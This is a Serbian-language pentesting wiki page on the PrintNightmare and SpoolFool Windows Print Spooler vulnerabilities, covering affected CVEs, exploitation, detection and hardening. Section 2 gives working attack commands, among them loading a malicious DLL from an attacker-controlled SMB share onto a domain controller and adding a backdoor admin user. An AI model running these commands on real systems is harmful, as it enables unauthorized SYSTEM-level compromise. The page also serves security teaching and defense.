# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare je zajednički naziv za grupu ranjivosti u Windows servisu **Print Spooler** koje omogućavaju **izvršavanje proizvoljnog koda kao SYSTEM** i, kada je spooler dostupan preko RPC-a, **remote code execution (RCE) na domain controllerima i file serverima**. Najviše iskorišćavani CVE-ovi su **CVE-2021-1675** (u početku klasifikovan kao LPE) i **CVE-2021-34527** (potpuni RCE). Naknadni problemi, kao što su **CVE-2021-34481 („Point & Print“)** i **CVE-2022-21999 („SpoolFool“)**, dokazuju da je attack surface i dalje daleko od zatvorenog.

Ako tražite **authentication coercion / relay** preko spoolera, a ne **driver-based RCE/LPE**, pogledajte [ovu drugu stranicu o zloupotrebi printer coercion](printers-spooler-service-abuse.md). Ova stranica je fokusirana na **učitavanje drivera / DLL-ova kao SYSTEM**.

---

## 1. Ranjive komponente i CVE-ovi

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|„PrintNightmare #1“|LPE|Ispravljen u junskom CU-u iz 2021, ali zaobiđen pomoću CVE-2021-34527|
|2021|CVE-2021-34527|„PrintNightmare“|RCE/LPE|`AddPrinterDriverEx` omogućava authenticated korisnicima da učitaju driver DLL sa remote share-a; nakon avgusta 2021. ovo obično zahteva oslabljene Point & Print policies|
|2021|CVE-2021-34481|„Point & Print“|LPE|Instalacija unsigned drivera od strane non-admin korisnika|
|2022|CVE-2022-21999|„SpoolFool“|LPE|Kreiranje proizvoljnog direktorijuma → DLL planting – funkcioniše nakon patch-eva iz 2021.|

Svi oni zloupotrebljavaju jedan od **MS-RPRN / MS-PAR RPC metoda** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ili relationships poverenja unutar sistema **Point & Print**.

## 2. Exploitation techniques

### 2.1 Kompromitovanje remote Domain Controllera (CVE-2021-34527)

Authenticated, ali **non-privileged** domain user može da pokrene proizvoljne DLL-ove kao **NT AUTHORITY\SYSTEM** na remote spooleru (često DC-u) na sledeći način:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popularni PoC-ovi uključuju **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) i module `misc::printnightmare / lsa::addsid` autora Benjamina Delpyja u alatu **mimikatz**.

### 2.2 Lokalna privilege escalation (bilo koji podržani Windows, 2021-2024)

Isti API može se pozvati **lokalno** radi učitavanja drivera iz direktorijuma `C:\Windows\System32\spool\drivers\x64\3\` i dobijanja SYSTEM privilegija:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Savremena trijaža na zakrpljenim hostovima

Na potpuno ažuriranom hostu, javni PrintNightmare PoC-ovi često ne uspevaju zato što Windows sada podrazumevano dozvoljava instalaciju drajvera štampača samo administratorima (`RestrictDriverInstallationToAdministrators=1` od 10. avgusta 2021). Pre nego što pokrenete exploit protiv mete, prvo proverite da li je okruženje poništilo tu bezbednosnu promenu zbog legacy implementacija štampača:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Dve najzanimljivije slabe vrednosti su obično:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Sa Linux sistema brzo potvrdite da cilj izlaže relevantne print RPC interfejse pre pokretanja PoC-a:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Neki noviji javno dostupni alati takođe pružaju bezbedniji **check/list** tok rada pre slanja DLL-a:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Ako dobijete `RPC_E_ACCESS_DENIED` (`0x8001011b`) kao korisnik sa niskim privilegijama, obično vidite podrazumevano ponašanje nakon 2021. godine, a ne problem sa transportom.

> Na Windows 11 22H2+ i novijim client buildovima, remote printing podrazumevano koristi **RPC over TCP**, dok je **RPC over named pipes** (`\PIPE\spoolss`) onemogućen, osim ako se izričito ponovo ne omogući. Neki stariji PoC-ovi i beleške iz lab okruženja i dalje pretpostavljaju da je named pipe dostupan.

### 2.4 Package Point & Print abuse on “patched” networks

Mnoga enterprise okruženja ostala su **vulnerable by policy** nakon originalnih patch-eva iz 2021. godine, zato što su helpdesk ili print-server workflow-i i dalje zahtevali da non-admin korisnici instaliraju ili ažuriraju drivere. U praksi, offensive playbook postaje:

- Ako su security prompt-ovi potpuno onemogućeni, **classic arbitrary-DLL PrintNightmare** je i dalje najkraći put.
- Ako je omogućena opcija `Only use Package Point and Print`, obično je potrebno preći na **signed package-aware driver** putanju, umesto direktnog ubacivanja raw DLL-a.
- Istraživanje iz 2024. godine pokazalo je da **`Package Point and Print - Approved servers` sam po sebi nije čvrsta trust boundary**: ako attacker može da spoof-uje ili hijack-uje name resolution za jedan odobreni print server, žrtve i dalje mogu biti preusmerene na malicious server koji zadovoljava policy provere.
- Čak i kombinovanje UNC hardening-a sa prinudnim RPC-over-SMB može biti nepouzdano, zato što moderni client-i mogu da **fall back-uju na RPC over TCP**.

Zbog toga se moderna PrintNightmare-style eksploatacija često više zasniva na **abuse-u enterprise printer deployment policy-ja** nego na neizmenjenom replay-u originalnog PoC-a iz 2021. godine.

### 2.5 SpoolFool (CVE-2022-21999) – bypassing 2021 fixes

Microsoft-ovi patch-evi iz 2021. godine blokirali su remote driver loading, ali **nisu ojačali directory permissions**. SpoolFool zloupotrebljava parametar `SpoolDirectory` kako bi kreirao proizvoljni direktorijum unutar `C:\Windows\System32\spool\drivers\`, ubacuje payload DLL i primorava spooler da ga učita:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit funkcioniše na potpuno zakrpljenim sistemima Windows 7 → Windows 11 i Server 2012R2 → 2022 pre ažuriranja iz februara 2022.

---

## 3. Detekcija i hunting

* **PrintService logs** – omogućite kanal *Microsoft-Windows-PrintService/Operational* i pratite **Event ID 316** (drajver je dodat/ažuriran, obično uključuje nazive DLL datoteka) tokom uspešnih i neuspešnih pokušaja. Uparite ga sa **Event ID 808/811** za sumnjive greške učitavanja spooler modula/drajvera.
* **Sysmon** – `Event ID 7` (učitana image datoteka) ili `11/23` (upisivanje/brisanje datoteke) unutar `C:\Windows\System32\spool\drivers\*` kada je nadređeni proces **spoolsv.exe**.
* **Process lineage** – generišite alert svaki put kada **spoolsv.exe** pokrene `cmd.exe`, `rundll32.exe`, PowerShell ili bilo koji neočekivani nepodpisani child process.
* **Network telemetry** – neočekivana SMB preuzimanja iz procesa **spoolsv.exe** sa share-ova pod kontrolom napadača ili neuobičajen printer RPC saobraćaj sa servera koji ne bi trebalo da se ponašaju kao print serveri predstavljaju veoma korisne indikatore.

## 4. Mitigacija i hardening

1. **Patch!** – primenite najnoviji cumulative update na svakom Windows hostu na kojem je instaliran Print Spooler servis.
2. **Onemogućite spooler tamo gde nije potreban**, naročito na Domain Controllerima:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blokirajte udaljene konekcije** uz zadržavanje mogućnosti lokalnog štampanja – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Ograničite Point & Print samo na administratore** podešavanjem:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaljna uputstva nalaze se u Microsoft KB5005652
5. Ako poslovni zahtevi nalažu `RestrictDriverInstallationToAdministrators=0`, tretirajte svaku drugu printer policy kao **samo delimičnu mitigaciju**. Kao minimum, preferirajte **package-aware drivers**, omogućite **Only use Package Point and Print** i ograničite **Package Point and Print - Approved servers** na eksplicitno navedene print servere unutar forest-a.
6. **Ne vraćajte privatnost printer RPC-a na prethodni nivo** samo da biste rešili neispravna mapiranja printera. Okruženja koja podešavaju `RpcAuthnLevelPrivacyEnabled=0` poništavaju hardening uveden za **CVE-2021-1678** i obično zahtevaju dodatnu pažnju tokom engagementa.

---

## 5. Povezana istraživanja / alati

* [`mimikatz` `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) moduli
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardna Impacket implementacija sa režimima `-check`, `-list` i `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper sa ugrađenom SMB isporukom, podrškom za više meta i režimima `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – zloupotreba sopstvenog ranjivog printer drajvera kroz package Point & Print
* SpoolFool exploit i write-up
* 0patch micropatches za SpoolFool i druge spooler greške

Ako želite da **iznudite autentikaciju** preko spooler-a umesto učitavanja drajvera, pređite na [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Reference

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
